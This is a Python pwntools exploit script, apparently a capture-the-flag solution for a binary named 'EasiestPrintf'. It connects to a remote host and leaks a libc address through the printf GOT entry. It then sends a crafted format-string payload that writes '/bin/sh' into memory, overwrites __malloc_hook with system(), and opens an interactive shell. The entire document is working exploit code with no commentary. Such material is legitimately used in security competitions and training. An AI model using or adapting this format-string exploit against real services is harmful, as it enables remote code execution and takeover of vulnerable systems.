from pwn import *

#s = process("./EasiestPrintf")
#libc = ELF("libc.so.local")
s = remote("202.120.7.210", 12321)
libc = ELF("libc.so.6")

s.readline()

printf_got = 0x8049FC8
s.sendline(str(printf_got))

buf = s.readline()

libc_printf = int(buf,16)
print hex(libc_printf)
libc.address = libc_printf-libc.symbols['printf']

binsh = "/bin/sh"
binsh = binsh.ljust(len(binsh)/2*2+2, "\x00")

binshaddr = 0x804A049

fmt = ""
ptrs = ""
writ = 12 + 4*(len(binsh)/2)
for i in xrange(0,len(binsh)/2):
	ptrs += p32(binshaddr+i*2)
	count = u16(binsh[2*i:2*i+2])
	fmt += "%%.%du%%%d$hn" % ((0x10000+count-writ)&0xffff, 7+i)
	writ = count
	print binsh[2*i:2*i+2]

malloc_hook = libc.symbols['__malloc_hook']
system = libc.symbols['system']

ptrs += p32(malloc_hook)
ptrs += p32(malloc_hook+1)
ptrs += p32(malloc_hook+3)

print hex(libc.address)
print hex(malloc_hook)
print hex(system)

count = system&0xff
fmt += "%%.%du%%%d$n" % ((0x10000+count-writ)&0xffff, 8+i)
writ = count

count = (system>>8)&0xffff
fmt += "%%.%du%%%d$hn" % ((0x10000+count-writ)&0xffff, 9+i)
writ = count

count = system>>24
fmt += "%%.%du%%%d$n" % ((0x10000+count-writ)&0xffff, 10+i)
fmt += "%%%d$%d.x" % (8,binshaddr-32)

fmt_st = ptrs+fmt
assert(len(fmt_st)<=158)
s.sendline(fmt_st)
s.interactive()
